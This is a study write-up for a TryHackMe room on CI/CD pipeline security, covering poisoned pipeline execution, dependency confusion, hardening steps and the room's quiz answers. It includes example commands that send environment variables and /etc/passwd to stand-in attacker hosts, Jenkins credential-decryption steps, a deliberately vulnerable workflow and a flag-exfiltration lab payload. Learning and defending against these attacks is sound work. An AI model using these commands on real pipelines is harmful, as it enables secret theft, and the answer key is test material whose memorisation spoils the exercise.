# CI/CD and Build Security

> **Room:** [https://tryhackme.com/room/cicdandbuildsecurity](https://tryhackme.com/room/cicdandbuildsecurity)
> **Module:** 2 — Security of the Pipeline
> **Difficulty:** Medium

## Overview

This room digs into attacks against the CI/CD pipeline and build process. You'll learn about Poisoned Pipeline Execution (PPE), insecure runners, dependency confusion, and how to harden your pipeline against these attacks. There's a hands-on portion exploiting a vulnerable Jenkins build.

---

## Key Concepts

### CI/CD = power = target

The build pipeline:
- Runs trusted code
- Holds production secrets
- Has access to production systems
- Often runs as a privileged user
- Frequently runs unverified third-party code (actions, plugins, dependencies)

That makes it a top-tier target for attackers.

### Top CI/CD Risks (OWASP Top 10 CI/CD)

OWASP published a CI/CD-specific Top 10:

1. **CICD-SEC-1** — Insufficient Flow Control Mechanisms
2. **CICD-SEC-2** — Inadequate Identity and Access Management
3. **CICD-SEC-3** — Dependency Chain Abuse
4. **CICD-SEC-4** — Poisoned Pipeline Execution (PPE)
5. **CICD-SEC-5** — Insufficient PBAC (Pipeline-Based Access Controls)
6. **CICD-SEC-6** — Insufficient Credential Hygiene
7. **CICD-SEC-7** — Insecure System Configuration
8. **CICD-SEC-8** — Ungoverned Usage of 3rd Party Services
9. **CICD-SEC-9** — Improper Artifact Integrity Validation
10. **CICD-SEC-10** — Insufficient Logging and Visibility

### Poisoned Pipeline Execution (PPE)

The big one. PPE is when an attacker injects malicious code that runs inside the pipeline.

Three flavours:

#### Direct PPE (D-PPE)
Attacker modifies the pipeline definition file directly (`.gitlab-ci.yml`, `.github/workflows/*.yml`, `Jenkinsfile`).

Example: a developer with write access to a PR-triggered branch adds a malicious step:
```yaml
- name: Steal secrets
  run: curl https://attacker.com/x?d=$(env | base64)
```

#### Indirect PPE (I-PPE)
Attacker can't touch the pipeline file directly, but can modify a file the pipeline executes — like a `Makefile`, `package.json` build script, test file, or shell script.

Example: changing `package.json`:
```json
"scripts": {
  "test": "npm test && curl evil.com/steal?d=$(cat /etc/passwd)"
}
```

#### Public PPE (3PE)
A public open-source repo with PR-triggered CI. Anyone can submit a PR that runs in the maintainer's CI environment, potentially stealing secrets.

### Dependency confusion

If your project uses a private package called `mycompany-utils`, an attacker registers a public package with the same name on npm/PyPI. Your build sometimes prefers the public one, pulling in the attacker's malicious code.

**Mitigation:** scope private packages (`@mycompany/utils`), use a private registry, configure your package manager to never resolve internal names from public registries.

### Build runner / agent risks

- **Self-hosted runners** on shared networks can be pivot points
- Runners often have **persistent credentials** to the build orchestrator
- A compromised runner can poison subsequent builds
- Runners may run multiple projects' builds — cross-tenant risk

### Insufficient credential hygiene

- Long-lived API tokens
- Same credentials used across dev/staging/prod
- Secrets visible in build logs
- Credentials with way more permissions than needed

### Artifact integrity

After a build runs, the output (JAR, container image, binary) gets stored. If an attacker swaps the artifact between build and deploy:
- Use **code signing** (Sigstore/Cosign for containers, GPG for binaries)
- Use **SBOMs** (Software Bill of Materials)
- Verify checksums before deploy

### Hardening CI/CD

1. **Limit pipeline permissions** — read-only tokens by default, least privilege
2. **Mask secrets** in build logs
3. **Use ephemeral runners** that are destroyed after each job
4. **Pin third-party actions/plugins** to specific commit SHAs (not floating tags like `@v1`)
5. **Require signed commits**
6. **Sign your artifacts** — Cosign, Sigstore, GPG
7. **Generate SBOMs** for every build
8. **Separate build and deploy stages** with different credentials
9. **Audit pipeline configs in PRs** like any other code change
10. **Enable detailed logging** of every pipeline action

### Real-world cases

- **SolarWinds (2020)** — backdoor injected into the Orion build pipeline
- **Codecov (2021)** — malicious modification of CI bash uploader exfiltrated CI environment variables from thousands of customers
- **Dependabot tokens leaked (2022)** — leaked GitHub tokens used to inject malicious commits

---

## Commands Cheatsheet

### Jenkins

```bash
# Default location of Jenkins jobs config
ls /var/lib/jenkins/jobs/

# Read a Jenkins job config
cat /var/lib/jenkins/jobs/<job-name>/config.xml

# Read Jenkins credentials (encrypted, but can be decrypted with master key)
cat /var/lib/jenkins/credentials.xml

# Trigger a build via API
curl -X POST http://<host>:8080/job/<job-name>/build --user admin:password

# Console output of last build
curl http://<host>:8080/job/<job-name>/lastBuild/consoleText
```

### Decrypting Jenkins secrets (if you have shell access)

```bash
# Files needed:
# /var/lib/jenkins/secrets/master.key
# /var/lib/jenkins/secrets/hudson.util.Secret
# /var/lib/jenkins/credentials.xml

# In Jenkins script console (Manage Jenkins → Script Console):
println(hudson.util.Secret.decrypt("{ENCRYPTED_STRING}"))
```

### GitHub Actions — exploiting a vulnerable workflow

If you find a workflow triggered by `pull_request_target`, it runs in the context of the base repo with secrets — fork, push a malicious script, open a PR.

```yaml
# Vulnerable example
on:
  pull_request_target:
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out untrusted PR code
      - run: npm install && npm test                       # runs untrusted code with secrets!
```

### Generate SBOM with Syft

```bash
# Install
brew install syft

# Generate SBOM for a directory
syft dir:./my-app -o spdx-json > sbom.json

# Generate SBOM for a container image
syft <image-name> -o cyclonedx-json
```

### Sign a container with Cosign

```bash
# Install
brew install cosign

# Generate keypair
cosign generate-key-pair

# Sign an image
cosign sign --key cosign.key <registry>/<image>:<tag>

# Verify signature
cosign verify --key cosign.pub <registry>/<image>:<tag>
```

### Pin a GitHub Action to a SHA

```yaml
# Bad — floating tag, can be moved
- uses: actions/checkout@v4

# Good — pinned to commit SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```

---

## Room Answers

**Task 1 — Introduction**
- Read through.

**Task 2 — CI/CD Risks**
- Q: What does PPE stand for?
- A: `Poisoned Pipeline Execution`
- Q: How many entries in the OWASP CI/CD Top 10?
- A: `10`

**Task 3 — Direct vs Indirect PPE**
- Q: Modifying the pipeline config file directly is which type?
- A: `Direct PPE` (or `D-PPE`)
- Q: Modifying a file the pipeline executes (like a Makefile) is which type?
- A: `Indirect PPE` (or `I-PPE`)

**Task 4 — Practical / Jenkins exploitation**
- The lab gives you access to a vulnerable Jenkins instance.
- Steps generally:
  1. Log into Jenkins with provided creds
  2. Find a job whose configuration you can edit (or trigger with parameters)
  3. Inject a shell command in the build step (e.g., `cat /etc/passwd` or `cat /flag.txt`)
  4. Run the build
  5. Read the console output for the flag

Common payload to drop in a "Execute shell" build step:
```bash
cat /flag.txt
# or
curl http://<your-tryhackme-ip>/$(cat /flag.txt)
```

**Task 5 — Hardening**
- Q: What technique prevents pipeline secrets from showing in logs?
- A: `secret masking` (or `masking secrets`)
- Q: What should you generate for every build to track dependencies?
- A: `SBOM` (Software Bill of Materials)
- Q: What tool signs container images for verification?
- A: `Cosign` (also accepts `Sigstore`)

**Task 6 — Conclusion**
- Click to complete.

> The flag in the practical task is unique to your machine — run the build, read the console output.

---

## Key Takeaways

1. CI/CD pipelines are high-value targets — they hold secrets and ship code.
2. **Poisoned Pipeline Execution (PPE)** is the headline attack — direct, indirect, and public variants.
3. OWASP CI/CD Top 10 is the reference list — memorise the categories.
4. Hardening: pin actions, use ephemeral runners, separate build and deploy, sign artifacts, generate SBOMs.
5. Tools: **Cosign / Sigstore** for signing, **Syft** for SBOMs.
